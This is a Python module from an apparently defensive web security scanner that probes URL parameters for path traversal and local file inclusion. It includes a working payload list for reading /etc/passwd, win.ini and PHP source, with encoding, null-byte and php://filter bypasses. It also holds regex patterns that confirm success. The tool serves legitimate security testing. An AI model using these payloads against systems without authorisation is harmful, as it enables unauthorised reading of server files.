# websec/scanner/access_control/path_traversal.py
"""Path Traversal / Local File Inclusion Scanner"""

import re
from typing import List, Dict, Optional
import aiohttp
from urllib.parse import quote

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class PathTraversalScanner(BaseScanner):
    """Scanner for Path Traversal / LFI vulnerabilities"""
    
    name = "Path Traversal Scanner"
    description = "Detects Path Traversal and Local File Inclusion vulnerabilities"
    owasp_category = OWASPCategory.A01_BROKEN_ACCESS_CONTROL
    
    # Path traversal payloads
    PAYLOADS = [
        # Basic traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\win.ini",
        
        # URL encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        
        # Double URL encoded
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        
        # Unicode / UTF-8 encoded
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%c1%9c..%c1%9c..%c1%9cwindows/win.ini",
        
        # Null byte injection (for older systems)
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.html",
        
        # Absolute paths
        "/etc/passwd",
        "C:\\windows\\win.ini",
        
        # Filter bypass
        "....//....//....//etc/passwd",
        "..../..../..../etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        
        # Wrapper protocols (for PHP)
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "file:///etc/passwd",
        
        # Depth variations
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
    ]
    
    # Patterns that indicate file parameters
    FILE_PARAM_PATTERNS = [
        r'file', r'path', r'page', r'document', r'doc',
        r'folder', r'root', r'include', r'inc', r'require',
        r'template', r'tmpl', r'view', r'content', r'conf',
        r'config', r'load', r'read', r'retrieve', r'fetch',
        r'src', r'source', r'url', r'uri', r'location',
        r'img', r'image', r'pdf', r'attachment', r'download',
    ]
    
    # Evidence patterns for successful traversal
    LINUX_EVIDENCE = [
        r'root:.*:0:0:',
        r'daemon:.*:1:1:',
        r'bin:.*:2:2:',
        r'/bin/bash',
        r'/bin/sh',
        r'nobody:.*:65534:',
    ]

    WINDOWS_EVIDENCE = [
        r'\[extensions\]',
        r'\[fonts\]',
        r'\[mci extensions\]',
        r'\[files\]',
        r'\[Mail\]',
        r'for 16-bit app support',
        r'ARCHITECTURE=AMD64', # Found in environment files
        r'USERPROFILE=C:\\Users'
    ]
    
    PHP_SOURCE_EVIDENCE = [
        r'<\?php',
        r'<\?=',
        r'\$_GET',
        r'\$_POST',
        r'\$_REQUEST',
        r'include\s*\(',
        r'require\s*\(',
    ]
    
    async def scan(self, session: aiohttp.ClientSession, 
                   url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Scan for path traversal vulnerabilities"""
        vulnerabilities = []
        
        if not params:
            return vulnerabilities
        
        # Test each parameter
        for param_name, param_value in params.items():
            if self._is_potential_file_param(param_name, param_value):
                vuln = await self._test_path_traversal(session, url, params, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _is_potential_file_param(self, param_name: str, param_value: str) -> bool:
        """Check if parameter might be used for file operations"""
        param_lower = param_name.lower()
        
        # Check parameter name
        for pattern in self.FILE_PARAM_PATTERNS:
            if re.search(pattern, param_lower, re.IGNORECASE):
                return True
        
        # Check if value looks like a file path
        if any(ext in param_value.lower() for ext in ['.php', '.html', '.txt', '.pdf', '.jpg', '.png', '.xml', '.json']):
            return True
        
        if '/' in param_value or '\\' in param_value:
            return True
        
        return False
    
    async def _test_path_traversal(self, session: aiohttp.ClientSession,
                                    url: str, params: Dict[str, str],
                                    param_name: str) -> Optional[Vulnerability]:
        """Test a specific parameter for path traversal"""
        
        for payload in self.PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            response = await self.make_request(session, "GET", url, params=test_params)
            if not response:
                continue
            
            body = await response.text()
            
            # Check for Linux evidence
            for pattern in self.LINUX_EVIDENCE:
                if re.search(pattern, body):
                    return self.create_vulnerability(
                        vuln_type="Path Traversal / Local File Inclusion",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Linux system file content detected: {re.search(pattern, body).group()[:100]}",
                        description="The application is vulnerable to path traversal, allowing attackers to read arbitrary files from the server.",
                        cwe_id="CWE-22",
                        cvss_score=9.1,
                        remediation="Validate and sanitize all file path inputs. Use a whitelist of allowed files. Implement proper access controls and avoid using user input directly in file operations.",
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://cwe.mitre.org/data/definitions/22.html"
                        ]
                    )
            
            # Check for Windows evidence
            for pattern in self.WINDOWS_EVIDENCE:
                if re.search(pattern, body, re.IGNORECASE):
                    return self.create_vulnerability(
                        vuln_type="Path Traversal / Local File Inclusion",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Windows system file content detected: {re.search(pattern, body, re.IGNORECASE).group()[:100]}",
                        description="The application is vulnerable to path traversal, allowing attackers to read arbitrary files from the server.",
                        cwe_id="CWE-22",
                        cvss_score=9.1,
                        remediation="Validate and sanitize all file path inputs. Use a whitelist of allowed files. Implement proper access controls.",
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://cwe.mitre.org/data/definitions/22.html"
                        ]
                    )
            
            # Check for PHP source code disclosure
            for pattern in self.PHP_SOURCE_EVIDENCE:
                if re.search(pattern, body):
                    return self.create_vulnerability(
                        vuln_type="Local File Inclusion - Source Code Disclosure",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"PHP source code detected in response",
                        description="The application is vulnerable to LFI allowing source code disclosure.",
                        cwe_id="CWE-98",
                        cvss_score=7.5,
                        remediation="Never use user input directly in include/require statements. Implement a whitelist of allowed files.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
                        ]
                    )
        
        return None